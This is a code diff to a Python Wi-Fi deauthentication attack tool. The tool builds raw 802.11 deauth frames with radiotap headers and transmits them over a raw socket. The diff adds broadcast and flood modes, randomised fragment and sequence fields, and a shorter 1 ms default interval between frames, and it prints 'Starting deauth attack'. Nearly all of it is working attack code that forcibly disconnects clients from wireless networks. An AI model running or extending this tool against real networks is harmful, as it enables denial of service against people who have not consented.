@@ -30,18 +30,19 @@ import time
 
 def f_assem(args):
     # Parse command-line arguments
-    interface = args.netinterface # handled automatically
-    dest_mac = args.dest # mapped
-    source_mac = args.ap_source # mapped
-    network_bssid = args.net_bssid # mapped
-    broadcast_attack =  args.broadcast # mapped
-    frag = args.fragment # mapped
-    seq_num = args.sequence # mapped
-    reason_code = args.reason_code # mapped
-    timedelay = args.time # mapped
-    frame_flood = args.flood # mapped
-    num_frames = args.count # mapped
-    dur_of_attack = args.duration # mapped
+    interface = args.netinterface
+    dest_mac = args.dest
+    source_mac = args.ap_source
+    network_bssid = args.net_bssid
+    broadcast_attack =  args.broadcast
+    frag = args.fragment
+    seq_num = args.sequence
+    reason_code = args.reason_code
+    timedelay = args.delay
+    frame_flood = args.flood
+    num_frames = args.count
+    dur = args.duration
+    randfrag = args.randomfrag
 
     if any(arg in sys.argv for arg in ("-h", "--help")):
         parser = argparse.ArgumentParser()
@@ -50,6 +51,7 @@ def f_assem(args):
     if os.geteuid() != 0:
         print("ATTENTION: Script requires root privlages, please run as root")
         exit(1)
+
     # handle all illogical arguments
     if (broadcast_attack or timedelay or frame_flood or num_frames or
     frag or seq_num or reason or dur_of_attack) and not (dest_mac or broadcast_attack):
@@ -73,15 +75,21 @@ def f_assem(args):
     f_ctl = struct.pack('B', 0xC0)
 
     # second byte makeup of FCF
-    if not frag:
-        ch = "NO"
+    if not (frag or randfrag):
         f_frag = struct.pack('B', 0x00)
-    elif frag:
-        ch = "YES"
-        f_frag = struct.pack('B', 0x10)
+        ch = "PRESET"
+    elif (frag or randfrag):
+        f_frag = struct.pack('B', 0x20)
+        if frag:
+            ch = "MANUAL"
+        if randfrag:
+            ch = "RANDOM"
 
     # Duration field
-    f_dur = struct.pack('<H', 0x00)
+    if not dur:
+        f_dur = struct.pack('<H', 0x00)
+    if dur:
+        f_dur = struct.pack('<H', dur & 0xFFFF)
 
     # Address 1 field
     if broadcast_attack:
@@ -107,22 +115,26 @@ def f_assem(args):
 def main():
     args = okeusarguments.parse_arguments()
 
-    timedelay = args.time # mapped
-    frame_flood = args.flood # mapped
-    num_frames = args.count # mapped
-    dur_of_attack = args.duration # mapped
+    timedelay = args.delay
+    frame_flood = args.flood
+    num_frames = args.count
+    dur = args.duration
     interface = args.netinterface
     verbose = args.verbose
-    dest_mac = args.dest # mapped
-    source_mac = args.ap_source # mapped
-    network_bssid = args.net_bssid # mapped
-    broadcast_attack =  args.broadcast # mapped
-    frag = args.fragment # mapped
-    seq_num = args.sequence # mapped
-    reason_code = args.reason_code # mapped
+    dest_mac = args.dest
+    source_mac = args.ap_source
+    network_bssid = args.net_bssid
+    broadcast_attack =  args.broadcast
+    frag = args.fragment
+    seq_num = args.sequence
+    reason_code = args.reason_code
+    randfrag = args.randomfrag
+    autoseq = args.autoseq
+    runtime = args.runtime
+    dry = args.dryrun
 
     f_ctl, f_frag, f_dur, ct, src, net, ch = f_assem(args)
-    radio, ver, pad, rt_len, fp = rt.rt_head()
+    radio, vr, pad, rt_len, fp = rt.rt_head()
     df = radio + f_ctl + f_frag + f_dur + ct + src + net
 
     def reas():
@@ -134,16 +146,52 @@ def main():
 
         return rc
 
-    def ver():
+    def fs():
+        # Sequence Control Field
+        if not hasattr(fs, "sn"):
+            fs.sn = 1
+        if not (frag or seq_num or randfrag or autoseq):
+            seq = struct.pack('<H', 0x00)
+
+        elif randfrag and not (frag or seq_num or autoseq):
+            rf = random.randint(1, 14)
+            seq = struct.pack('<H', rf & 0x0F)
+        elif autoseq and not (frag or seq_num or randfrag):
+            seq = struct.pack('<H', (fs.sn << 4) & 0xFFF0)
+            fs.sn += 1
+        elif (autoseq and randfrag) and not (seq_num or frag):
+            rf = random.randint(1, 14)
+            if rf >= 8:
+                seq = struct.pack('<H', ((fs.sn << 4) & 0xFFF0) | (rf & 0x0F))
+                fs.sn += 1
+            else:
+                seq = struct.pack('<H', (fs.sn << 4) & 0xFFF0)
+        elif (randfrag and seq_num) and not (frag or autoseq):
+            rf = random.randint(1, 14)
+            seq = struct.pack('<H', ((seq_num << 4) & 0xFFF0) | (rf & 0x0F))
+        elif frag and not (seq_num or randfrag or autoseq):
+            seq = struct.pack('<H', frag & 0x0F)
+        elif (frag and autoseq) and not (randfrag or seq_num):
+            seq = struct.pack('<H', ((fs.sn << 4) & 0xFFF0) | (frag & 0x0F))
+            fs.sn += 1
+        elif (frag and seq_num) and not (randfrag or autoseq):
+            seq = struct.pack('<H', ((seq_num << 4) & 0xFFF0) | (frag & 0x0F))
+        elif (seq_num) and not (frag or randfrag or autoseq):
+            seq = struct.pack('<H', ((seq_num << 4) & 0xFFF0) )
+
+        return seq
+
+    def verb():
+        seq = fs()
         print(f"{'Frame composition'.center(100)}")
         print("-" * 100)
-        print(f"Radiotap version: {ver}")
+        print(f"Radiotap version: {vr.hex()}")
         print(f"Radiotap pad: {pad.hex()}")
         print(f"Radiotap length: {rt_len.hex()}")
         print(f"Radiotap fields present: {fp.hex()}")
         print(f"Frame type: {f_ctl.hex().upper()}")
-        print(f"Fragmentation set: {ch}")
-        print("Duration: 0x00, 0x00")
+        print(f"Fragmentation set: {f_frag.hex()} - type: {ch}")
+        print(f"Duration: {f_dur.hex().upper()}")
         if broadcast_attack:
             print("Destination: FF:FF:FF:FF:FF:FF")
         elif dest_mac:
@@ -153,35 +201,23 @@ def main():
         elif source_mac:
             print(f"Source: {source_mac.upper()}")
         print(f"Network: {network_bssid.upper()}")
-        print(f"Fragmentation: {frag}")
-        print(f"Sequence Control: {seq_num}")
+        if not (autoseq or randfrag):
+            print(f"Sequence Control: {seq.hex().upper()}")
+        if (autoseq or randfrag):
+            print("Sequence Control: DYNAMIC")
+        # if not randfrag:
+        #     print(f"Fragmentation: {frag}")
+        # if randfrag:
+        #     print("Fragmentaiton: RANDOM")
+        # if not autoseq:
+        #     print(f"Sequence Control: {((seq_num << 4) & 0xFFF0)}")
+        # if autoseq:
+        #     print("Sequence Control: AUTOMATIC")
         if not reason_code:
             print(f"Reason Code: {reason.def_code(0)}")
         if reason_code:
             print(f"Reason Code: {reason.def_code(reason_code)}")
         print("-" * 100)
-
-    def fs():
-        # Sequence Control Field
-        if not hasattr(fs, "sn"):
-            fs.sn = 1
-        if not (frag or seq_num):
-            seq = struct.pack('<H', 0x00)
-        elif frag and not seq_num:
-            rf = random.randint(1, 14)
-            seq = struct.pack('<H', rf & 0x0F)
-        elif seq_num and not frag:
-            seq = struct.pack('<H', (fs.sn << 4) & 0xFFF0)
-            fs.sn += 1
-        elif (seq_num and frag):
-            rf = random.randint(1, 14)
-            if rf >= 8:
-                seq = struct.pack('<H', ((fs.sn << 4) & 0xFFF0) | (rf & 0x0F))
-                fs.sn += 1
-            else:
-                seq = struct.pack('<H', (fs.sn << 4) & 0xFFF0)
-
-        return seq
 
     # Open the socket
     s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
@@ -192,10 +228,11 @@ def main():
     if frame_flood:
         nmframe = 1
         if verbose:
-            ver()
+            verb()
         try:
             tg = ct.hex().upper()
             tgt = ''.join([f'\\x{tg[i:i+2]}' for i in range(0, len(tg), 2)])
+            print("Starting deauth attack")
             print(f"Flooding: {tgt}\nInterrupt with CTRL + C")
             while True:
                 sq = fs()
@@ -216,7 +253,7 @@ def main():
             t = timedelay / 1000
             ti = timedelay
         if not timedelay:
-            ti = 500
+            ti = 1
             t = ti / 1000
         if num_frames:
             n = num_frames
@@ -224,7 +261,8 @@ def main():
             n = 1
         try:
             if verbose:
-                ver()
+                verb()
+            print("Starting deauth attack")
             print(f"Sending {n} frames at a rate of {ti} ms.")
             for i in range(n):
                 sq = fs()
